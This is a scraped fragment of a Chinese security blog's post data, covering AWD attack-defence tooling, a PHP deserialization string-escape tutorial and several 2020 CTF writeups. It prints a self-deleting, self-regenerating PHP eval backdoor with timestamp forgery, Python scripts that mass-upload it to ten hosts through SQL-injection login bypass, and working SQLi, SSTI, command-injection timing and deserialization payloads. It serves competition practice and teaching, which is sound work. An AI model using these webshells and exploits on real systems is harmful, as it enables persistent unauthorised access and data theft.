(isset($argv[1]) &amp;&amp; $argv[1] === \"--uninstall\") &#123; if (!isset($argv[2])) &#123; die(\"Usage: php fileinclude.php --uninstall [web dir] [incoude file]\\n Example: php fileinclude.php --uninstall /var/www/html /tmp/filename.php\"); &#125; $install_path = $argv[2]; $include_file = $argv[3]; if ($install_path[strlen($install_path) - 1] !== '/') &#123; $install_path .= \"/\"; &#125; uninstall($install_path,$include_file); die();&#125;?&gt; 用法： 1234包含：php fileinclude.php --install [web dir] [filename] php fileinclude.php --install /var/www/html /tmp/129fc23931a5be05b43f0e9d2c90bd15/weblogpro.php 删除包含：php fileinclude.php --uninstall [web dir] [filename] php fileinclude.php --install /var/www/html /tmp/129fc23931a5be05b43f0e9d2c90bd15/weblogpro.php 中间件日志⽐如apache，nginx查看当前访问量前⼗的链接 1cat /var/log/apache2/access.log |awk '&#123;print $7&#125;'|sort|uniq -c| sort -r|head 攻击不死马普通版 1234567891011121314&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = 'admin.php'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"3bf8d4b2d94742b03e7d08cdf1f32128\")&#123;@eval($_POST[a]);&#125; ?&gt;'; //9415p4ss20rd while (1)&#123; file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" admin.php'); usleep(1000); &#125;?&gt; ignore_user_abort(true):函数设置与客户机断开是否会终⽌脚本的执⾏。这⾥设置为true则忽略与⽤户的断开，即使与客户机断开脚本仍会执⾏。 set_time_limit() :函数设置脚本最⼤执⾏时间。这⾥设置为0，即没有时间⽅⾯的限制。 unlink(__FILE__) :删除⽂件本身，以起到隐蔽⾃身的作⽤。 while:循环内每隔 usleep(1000) 即写新的后⻔⽂件system(): 执⾏的命令⽤于修改⽂件的创建或修改时间，可以绕过“find /var/www/html –name *.php –mmin -10”命令检测最近10分钟修改或新创建的PHP⽂件，但不⼀定有⽤，可选。 ⽹上流传的不死⻢, while ⾥⾯只是并没有判断了这个⽂件是不是存在 ,那么我只需要把这个⽂件中的 shell 注释掉就可以绕过你的内存⽊⻢了。 进阶版 12345678910111213141516&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = 'admin.php'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"3bf8d4b2d94742b03e7d08cdf1f32128\")&#123;@eval($_POST[a]);&#125; ?&gt;'; //$code ='PD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iM2JmOGQ0YjJkOTQ3NDJiMDNlN2QwOGNkZjFmMzIxMjgiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4='; //9415p4ss20rd while (1)&#123; if(md5(file_get_contents($file))!==md5($code)) &#123; file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" admin.php'); &#125; usleep(1000); &#125;?&gt; 批量提交flag123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174import jsonimport requestsimport refrom threading import Thread#ignore the validity of the certificatefrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)#disable the security warnning messagerequests.packages.urllib3.disable_warnings()class FlagFile(): def __init__(self): # save flag self.flag_file = \"./flag.txt\" def add_one(self, flag): if flag: with open(self.flag_file, \"a+\") as f: f.write(flag + \"\\n\") def add_many(self, flags): if flags: with open(self.flag_file, \"a+\") as f: for flag in flags: f.write(flag + \"\\n\"); def del_all(self): f = open(self.flag_file, \"w+\") f.truncate() def get_all(self): with open(self.flag_file, \"r\", encoding='utf-8') as f: flags = set([i.strip() for i in f.readlines() if i ] ) return flagsdef submit_flag(flag): host_url=\"http://awd.hillstonenet.com/api/flag\" #提交地址 headers=&#123; \"Content-Type\": \"application/json; charset=UTF-8\", \"Authorization\": \"d89fdcf7f1fd37a69aef7ea0d507a51a\" &#125; #data=&#123; #'answer':flag, #'token': 'bf9805453b757d736b544c656d86e671' #&#125; data=&#123; \"flag\":flag &#125; try: data=json.dumps(data) r=requests.post(host_url,data=data,headers=headers) print(r.text) except Exception as e: print(e)# match the flagdef match_flag(content): comp = re.compile(\"hillstone&#123;.*?&#125;\") path = comp.findall(content) if path: print(path[0]) return path[0] return \"\"#web1def web1_shell(host,port): shell_url = \"http://&#123;&#125;:&#123;&#125;/admin/upload/admin.php?pass=p455word\".format(host, port) command=\"show_source('/flag');\" data = &#123; \"a\": command &#125; res=requests.post(url=shell_url,data=data) return match_flag(res.text)#web2def web2_sql(host,port): sql_url=\"http://&#123;&#125;:&#123;&#125;/sqlgunsearch.php\".format(host,port) data=&#123; \"key\": \"key=aa%' union select 1,2,load_file('/flag')#--\" &#125; try: res=requests.post(url=sql_url,data=data) return match_flag(res.text) except Exception as e: print(e)#web3def web3_shell(host,port): shell_url = \"http://&#123;&#125;:&#123;&#125;/includes/config.php?d=assert\".format(host, port) command = \"show_source('/flag');\" data = &#123; \"c\": command &#125; res = requests.post(url=shell_url, data=data) return match_flag(res.text)class web1_exp(): def __init__(self,host,port): self.host=host self.port=port self.flag_file=FlagFile() def sql(self): pass def rce(self): pass def webshell(self): flag=web1_shell(self.host,self.port) self.flag_file.add_one(flag)class web2_exp(): def __init__(self,host,port): self.host=host self.port=port self.flag_file=FlagFile() def sql(self): flag=web2_sql(self.host,self.port) self.flag_file.add_one(flag) def rce(self): pass def webshell(self): passclass web3_exp(): def __init__(self,host,port): self.host=host self.port=port self.flag_file=FlagFile() def sql(self): pass def rce(self): pass def webshell(self): flag=web3_shell(self.host,self.port) self.flag_file.add_one(flag)def web_exp(host,port,num): exp = eval(\"web&#123;&#125;_exp(host, port)\".format(num)) exp.sql() exp.rce() exp.webshell()def attack_web(host,port,num): base_host=host base_port=port tasks = [] flag_file = FlagFile() flag_file.del_all() for i in range(1, 11): tasks.append(Thread(target=web_exp, args=(base_host, base_port + i,num))) for task in tasks: task.start() for task in tasks: task.join() for flag in flag_file.get_all(): submit_flag(flag)if __name__=='__main__': base_host1 = \"ip\" base_port1 = 8100 base_host2 = \"ip\" base_port2 = 8200 base_host3 = \"ip\" base_port3 = 8300 attack_web(base_host1,base_port1,1) attack_web(base_host2, base_port2,2) attack_web(base_host3, base_port3,3) 批量上传webshell固定文件名12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import requestsfrom threading import Threadimport refilename=\"./webshell.php\" #webshell文件位置class UploadFile(): def __init__(self,upload_url,prefix_url,login_url=\"\"): self.session=requests.session() self.login_url=login_url self.upload_url=upload_url self.prefix_url=prefix_url self.suffix_url=\"\" def login(self): data = &#123; \"username\": \"admin'#\", \"password\": \"asd\" &#125; self.session.post(url=self.login_url, data=data) def upload(self): headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Length\": \"623\" &#125; f = &#123; # \"localUrl\": (None, \"webshell.php\"), \"pic\": (\"webshell.php\", open(filename, \"rb\"), \"application/octet-stream\") &#125; res = self.session.post(url=self.upload_url, files=f, headers=headers) self.suffix_url=self.upload_path(res.text) print(res.status_code) def active_webshell(self): try: self.session.get(url=self.prefix_url+self.suffix_url, timeout=3) except Exception as e: print(e) # get upload file path def upload_path(self,content): pass comp = re.compile(\"/upload.*?[.]php\") path = comp.findall(content) if path: print(path[0]) return path[0] return \"\"def start_upload(host,port): login_url = \"http://&#123;&#125;:&#123;&#125;/login.php\".format(host, port) upload_url = \"http://&#123;&#125;:&#123;&#125;/admin/upload.php\".format(host, port) prefix_url = \"http://&#123;&#125;:&#123;&#125;/admin\".format(host, port) uploadfile=UploadFile(upload_url,prefix_url,login_url) uploadfile.login() #login in uploadfile.upload()# upload undead webshell uploadfile.active_webshell()# active undead webshellif __name__=='__main__': base_host=\"ip\" base_port=8100 tasks=[] for i in range(1,11): t=Thread(target=start_upload,args=(base_host,base_port+i)) tasks.append(t) for task in tasks: task.start() for task in tasks: task.join() 随机文件名123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import requestsfrom threading import Threadimport hashlibimport refilename=\"./webshell.php\" #webshell文件位置shell_content='''&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '%s'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"47fe7f87f45e7403be0a9eb7a30a2970\")&#123;@eval($_POST[a]);&#125; ?&gt;'; while (1)&#123; if(md5(file_get_contents($file))!==md5($code)) &#123; file_put_contents($file,$code); system(\"touch -m -d '2018-12-01 09:10:12' $file\"); &#125; usleep(1000); &#125;?&gt;'''class UploadFile(): def __init__(self,host,port): self.session=requests.session() self.host=host self.port=port self.login_url = \"http://&#123;&#125;:&#123;&#125;/login.php\".format(host, port) self.upload_url = \"http://&#123;&#125;:&#123;&#125;/admin/upload.php\".format(host, port) self.prefix_url = \"http://&#123;&#125;:&#123;&#125;/admin\".format(host, port) self.suffix_url=\"\" def login(self): data = &#123; \"username\": \"admin'#\", \"password\": \"asd\" &#125; self.session.post(url=self.login_url, data=data) def upload(self): headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Length\": \"623\" &#125; shell_name=get_shell_name(self.host,self.port) f = &#123; # \"localUrl\": (None, \"webshell.php\"), \"pic\": (\"webshell.php\", shell_content%(shell_name), \"application/octet-stream\") &#125; res = self.session.post(url=self.upload_url, files=f, headers=headers) self.suffix_url=self.upload_path(res.text) print(res.status_code) def active_webshell(self): try: absolute_url=self.prefix_url+self.suffix_url print(absolute_url) self.session.get(url=absolute_url, timeout=3) except Exception as e: print(e) # get upload file path def upload_path(self,content): pass comp = re.compile(\"/upload.*?[.]php\") path = comp.findall(content) if path: print(path[0]) return path[0] return \"\"# generate md5 filenamedef get_shell_name(host,port): secret_key=\"ye1s\" strings=\"&#123;&#125;&#123;&#125;\".format(host,port)+secret_key md5=hashlib.md5() md5.update(strings.encode()) return \".\"+md5.hexdigest()[0:6]+\".php\"def start_upload(host,port): uploadfile=UploadFile(host,port) uploadfile.login() #login in uploadfile.upload()# upload undead webshell uploadfile.active_webshell()# active undead webshellif __name__=='__main__': base_host=\"ip\" base_port=8100 tasks=[] for i in range(1,11): t=Thread(target=start_upload,args=(base_host,base_port+i)) tasks.append(t) for task in tasks: task.start() for task in tasks: task.join() 一句话写文件","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"https://blog.cfyqy.com/tags/AWD/"}],"author":"ye1s"},{"title":"PHP 反序列化字符逃匿","slug":"PHP-反序列化逃匿","date":"2020-09-16T09:24:46.000Z","updated":"2021-05-12T09:36:31.803Z","comments":true,"path":"article/f552df11.html","link":"","permalink":"https://blog.cfyqy.com/article/f552df11.html","excerpt":"PHP 反序列化逃匿学习小记","text":"PHP 反序列化逃匿学习小记 漏洞原因在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。 PHP 反序列化特性 PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的。 在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败 对类中不存在的属性也会进行反序列化 逃匿类型过滤后字符变多示例代码 123456789101112131415161718&lt;?phpinclude 'flag.php';function filter($string)&#123; return str_replace('x','yy',$string);&#125;$username = $_GET['u'];$password = \"aaa\";$user = array($username, $password);$s = serialize($user);$r = filter($s);echo $r;$a= unserialize($r);if($a[1]==='admin')&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 此题中对序列化字符串中的x替换为yy,可能导致字符串长度增加。 当传入u=admin,序列化为 1a:2:&#123;i:0;s:5:\"admin\";i:1;s:3:\"aaa\";&#125; 反序列化后满足不了$a[1]===&#39;admin&#39;条件 当传入u=xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;}，此时替换序列化的结果为 1a:2:a:2:&#123;i:0;s:38:\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\";i:1;s:5:\"admin\";&#125;\";i:1;s:3:\"aaa\";&#125; 此时yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy的长度刚好为38，不会报错，再加上后面的;i:1;s:5:”admin”;}成功反序列化，后面的就被忽略了。 x个数的计算首先我们要确定需要添加的内容，也就是后面一串，即”;i:1;s:5:”admin”;}，长度为19(设为m)，满足以下式子(设有n个x字符，”;i:1;s:5:”admin”;}前面有y个非x字符)： 1n+y+m=2n+y // 原来字符串的长度 = 替换后去掉m的长度 解方程得n=19，即我们要有19个x，y随意，从等式可以看出抵消了 如果碰到除不尽的情况，我们可以在”;i:1;s:5:”admin”;}前面增加一些非x字符，类似 1a\";i:1;s:5:\"admin\";&#125; 此时m的长度大于19添加非x字符是错误的，因为永远也减少不了这些字符，如果出现不整除的情况，应该是还有其他替换字符的选项。 过滤后字符变少示例代码 12345678910111213141516171819&lt;?phpinclude 'flag.php';function filter($string)&#123; return str_replace('sec','',$string);&#125;$username = $_GET['u'];$password = $_GET['p'];$auth=\"guest\";$user = array($username, $password,$auth);$s = serialize($user);$r = filter($s);echo $r;$a= unserialize($r);if($a[2]==='admin')&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 要想得到flag，就要使得”;i:2;s:5:”admin”;}，长度为19，经过观察序列化后”;i:1;s:这部分是不会改变的，因为整个payload肯定是不超过100个字符的，所以加上后面的长度”;i:1;s:xx:” 为12个字符，这里存在着sec的替换，我们可以输入4个sec替换为空格，刚好空出12个字符，可以将”;i:1;s:xx:”这12个字符反序列化后在第一个元素值中，使得后面逃匿。最后payload 1u=secsecsecsec&amp;p=\";i:1;s:4:\"eval\";i:2;s:5:\"admin\";&#125; 也可以多添加几个sec，假设为5个，此时空出15个字符，减去”;i:1;s:xx:”这12个字符，还剩下3个，可以再输入三个字符填充。 1u=secsecsecsecsec&amp;p=123\";i:1;s:4:\"eval\";i:2;s:5:\"admin\";&#125; 例题2020安恒四月月赛安恒杯月赛 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpshow_source(\"index.php\");function write($data) &#123; return str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $data);&#125;function read($data) &#123; return str_replace('\\0\\0\\0', chr(0) . '*' . chr(0), $data);&#125;class A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = 'gqy'; function __destruct()&#123; $c = 'a'.$this-&gt;b; echo $c; &#125;&#125;class C&#123; public $c; function __toString()&#123; //flag.php echo file_get_contents($this-&gt;c); return 'nice'; &#125;&#125;$a = new A($_GET['a'],$_GET['b']);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$e = serialize($a);$c = write($e);echo $c;echo \"&lt;/br&gt;\";$d = read($c);echo $d;echo \"&lt;/br&gt;\";$b = unserialize($d);?&gt; 反序列利用链接为 1B __destruct() -&gt; C __toString() 正常利用序列化链为 123456789101112131415161718192021222324252627282930&lt;?phpclass A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = 'gqy'; // function __destruct()&#123; // $c = 'a'.$this-&gt;b; // echo $c; // &#125;&#125;class C&#123; public $c; // function __toString()&#123; // echo file_get_contents($this-&gt;c); // return 'nice'; // &#125;&#125;$c=new C;$c-&gt;c='flag.php';$b=new B;$b-&gt;b=$c;$ser=new A(\"test\",$b);echo serialize($ser);?&gt; 序列化结果 1O:1:\"A\":2:&#123;s:8:\"username\";s:4:\"test\";s:8:\"password\";O:1:\"B\":1:&#123;s:1:\"b\";O:1:\"C\":1:&#123;s:1:\"c\";s:8:\"flag.php\";&#125;&#125;&#125; 下面是我们实际上要添加的字符串 1\";s:8:\"password\";O:1:\"B\":1:&#123;s:1:\"b\";O:1:\"C\":1:&#123;s:1:\"c\";s:8:\"flag.php\";&#125;&#125;&#125; 这里write()中将&#39;chr(0) . &#39;*&#39; . chr(0)&#39;替换为&#39;\\0\\0\\0&#39;,长度由3变成6，增加三个字符，read()中&#39;\\0\\0\\0&#39;替换为chr(0) . &#39;*&#39; . chr(0)，长度由6变成3，减少3个字符。 先write()操作后read()，这里只能用字符缩短的逃匿方法。 正常序列化的字符串 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; 其中要利用username吃掉后面的&quot;;s:8:&quot;password&quot;;s:xx:&quot;,为23个字符。可以用6个\\0\\0\\0,可以减少24个字符，多减少了一个字符，在实际上要添加的字符串可以在多填上一个字符即可。 此时payload为 1?a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=a\";s:8:\"password\";O:1:\"B\":1:&#123;s:1:\"b\";O:1:\"C\":1:&#123;s:1:\"c\";s:8:\"flag.php\";&#125;&#125;&#125; [GYCTF2020]Easyphplib.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phperror_reporting(0);session_start();function safe($parm)&#123; $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);&#125;class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?'); if($this-&gt;id)&#123; $_SESSION['id']=$this-&gt;id; $_SESSION['login']=1; echo \"你的ID是\".$_SESSION['id']; echo \"你好！\".$_SESSION['token']; echo \"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\"; return $this-&gt;id; &#125; &#125; &#125; public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']); //这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age=$_POST['age']; $nickname=$_POST['nickname']; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return \"0-0\"; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;class dbCtrl&#123; public $hostname=\"127.0.0.1\"; public $dbuser=\"root\"; public $dbpass=\"root\"; public $database=\"test\"; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(\"连接失败，错误:\" . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') &#123; return $idResult; &#125; if (!$idResult) &#123; echo('用户不存在!'); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo('密码错误！'); return false; &#125; $_SESSION['token']=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125; login.php 1234567891011121314151617181920212223242526272829303132&lt;?phprequire_once('lib.php');?&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt; &lt;form action=\"login.php\" method=\"post\" style=\"margin-top: 300\"&gt; &lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt; &lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"UserName\" required&gt; &lt;br&gt; &lt;input type=\"password\" style=\"margin-top: 20\" name=\"password\" placeholder=\"password\" required&gt; &lt;br&gt; &lt;button style=\"margin-top:20;\" type=\"submit\"&gt;登录&lt;/button&gt; &lt;br&gt; &lt;img src='img/1.jpg'&gt;大家记得做好防护&lt;/img&gt; &lt;br&gt; &lt;br&gt;&lt;?php $user=new user();if(isset($_POST['username']))&#123; if(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['username']))&#123; die(\"&lt;br&gt;Damn you, hacker!\"); &#125; if(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['password']))&#123; die(\"Damn you, hacker!\"); &#125; $user-&gt;login();&#125;?&gt; &lt;/form&gt;&lt;/center&gt; update.php 123456789101112131415161718&lt;?phprequire_once('lib.php');echo '&lt;html&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;';if ($_SESSION['login']!=1)&#123; echo \"你还没有登陆呢！\";&#125;$users=new User();$users-&gt;update();if($_SESSION['login']===1)&#123; require_once(\"flag.php\"); echo $flag;&#125;?&gt; 参考https://blog.csdn.net/mochu7777777/article/details/105175949/ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;?phpclass dbCtrl&#123; public $hostname=\"127.0.0.1\"; public $dbuser=\"root\"; public $dbpass=\"root\"; public $database=\"test\"; public $name; public $password; public $mysqli; public $token; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(\"连接失败，错误:\" . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') &#123; return $idResult; &#125; if (!$idResult) &#123; echo('用户不存在!'); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo('密码错误！'); return false; &#125; $_SESSION['token']=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;class User&#123; public $id; public $age=null; public $nickname=null; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return \"0-0\"; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125;$up=new UpdateHelper();$user=new User();$info=new Info();$db=new dbCtrl();$up-&gt;sql=$user;$user-&gt;nickname=$info;$user-&gt;age='select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';$info-&gt;CtrlCase=$db;$db-&gt;name=\"admin\";$db-&gt;password=\"1\";$s=serialize($up);$pre='\";s:8:\"CtrlCase\";';$end=\"&#125;\";$payload=$pre.$s.$end;echo \"\\n\";//echo $payload;$length=strlen($payload);$union=\"\";for($i=0;$i&lt;strlen($payload);$i++)&#123; $union .=\"union\";&#125;echo $union.$payload; 参考文章：PHP反序列化字符逃逸浅析php反序列化字符串逃逸 详情可看此篇文章: PHP反序列化字符逃逸","categories":[],"tags":[],"author":"ye1s"},{"title":"2020年比赛题目集合","slug":"比赛题目集合","date":"2020-09-14T12:56:50.000Z","updated":"2021-04-22T05:27:30.215Z","comments":true,"path":"article/77cfb00d.html","link":"","permalink":"https://blog.cfyqy.com/article/77cfb00d.html","excerpt":"2020的一些题目集合","text":"2020的一些题目集合 钓鱼杯easyseed注意 PHP 版本 easywebcut 和sleepphp 12345678910111213141516171819202122&lt;?php$ch=curl_init();curl_setopt($ch, CURLOPT_URL, 'http://119.3.37.185/');curl_setopt($ch, CURLOPT_POST, true);$flag='flag&#123;';for($i=6;$i&lt;64;$i++)&#123; for($j=32;$j&lt;=127;$j++)&#123; $c=chr($j); $data=array('cmd' =&gt; \"a=`cut -b $i /flag*`;[ \\$a = \\\"$c\\\" ] &amp;&amp; sleep 1\" ); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $t1=microtime(true); curl_exec($ch); $t=microtime(true)-$t1; if($t&gt;1)&#123; $flag.=$c; echo \"$flag\\n\"; break; &#125; &#125;&#125;?&gt; python 123456789101112131415import requestsimport timeurl=\"http://119.3.37.185/\"flag=\"\"for i in range(6,65): for j in range(32,127): data=\"a=`cut -b &#123;&#125; /flag*`;[ $a = \\\"&#123;&#125;\\\" ] &amp;&amp; sleep 1\".format(i,chr(j)) #print(data) start_time=time.time() requests.post(url=url,data=&#123;\"cmd\":data&#125;) end_time = time.time() spend_time = end_time - start_time if spend_time&gt;1: flag += chr(j) print(flag) 楚慧杯套娃 被遗弃的 wafhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter 如下请求分别得到index.php和waf.php 1http://198.13.53.87:8002/?file=php://filter/convert.iconv.utf-8.utf-16/resource=waf.php index.php 123456789101112&lt;?phpinclude 'waf.php';include 'flag.php';$Waf = new Wafs;$get = $Waf-&gt;waf($_GET['file']);include ($get);$help_arr = ['hello' =&gt; 'zhangsan', 'waf' =&gt; $_GET['a'], 'goodthing' =&gt; 'no'];$help_ser = serialize($help_arr);$help_flag = unserialize($Waf-&gt;waf($help_ser, 0));if ($help_flag['goodthing'] === 'yes') &#123; echo $flag;&#125; ?&gt; waf.php 12345678910111213&lt;?php class Wafs &#123; public function waf($things, $all = 1) &#123; $waf_1 = \"/base|encode|print|zlib|quoted|write|rot13|read|flag|string/i\"; $waf_2 = \"/flag|eval|system|cat|whoami|flags/i\"; if ($all == 1) &#123; if (preg_match($waf_1, $things)) &#123; die(' N��\u001d\\Ջ;e4x\u0011b�vwaf&lt;�br&gt;'); &#125; &#125; return preg_replace($waf_2, 'hacker', $things); &#125;&#125; ?&gt; php反序列化字符逃匿，字符变多 1a&#x3D;catcatcatcatcatcatcatcatcateval&quot;;s:9:&quot;goodthing&quot;;s:3:&quot;yes&quot;;&#125; 巅峰极客babyflask无过滤，考SSTI 1http://eci-2ze91js64coesine03jt.cloudeci1.ichunqiu.com:8888/loged?name=&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__==%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].open(%27/flag%27,%27r%27).read()%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; babyback登陆框 password 存在布尔盲注 123456789101112131415161718192021222324import requestsdef ord2hex(string): result = '' for i in string: result += hex(ord(i)) result = result.replace('0x','') return '0x'+resultstring = [ord(i) for i in r'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;_-']flag= ''url = \"http://eci-2ze7qhojurw0cqotdnjs.cloudeci1.ichunqiu.com/index.php\"attack = ''for i in range(50): for j in string: attack = flag+chr(j) data=&#123; 'username':'\\\\', 'password':'or password regexp binary %s#'%(ord2hex('^'+attack)) &#125; r = requests.post(url,data=data,timeout=3) if \"用户名或密码错\" not in r.text: flag=flag+chr(j) print(flag) break 得到flag babyphp2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158&lt;?phperror_reporting(0);session_start();class User&#123; public $id; public $age=null; public $nickname=null; public $backup; public function login() &#123; if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(); if($this-&gt;id)&#123; $_SESSION['id']=$this-&gt;id; $_SESSION['login']=1; echo \"你的ID是\".$_SESSION['id']; echo \"你好！\".$_SESSION['token']; echo \"&lt;script&gt;window.location.href='upload.php'&lt;/script&gt;\"; &#125; &#125;&#125; public function upload()&#123; $uploader=new Upload(); $uploader-&gt;upload(); &#125; public function read()&#123; $reader=new reader(); $reader-&gt;read($_POST['filename']); &#125; public function __toString() &#123; $this-&gt;nickname-&gt;backup=$this-&gt;backup; $user = new User(); $user-&gt;id = $_SESSION['id']; $user-&gt;nickname = $_SESSION['token']; return serialize($user); 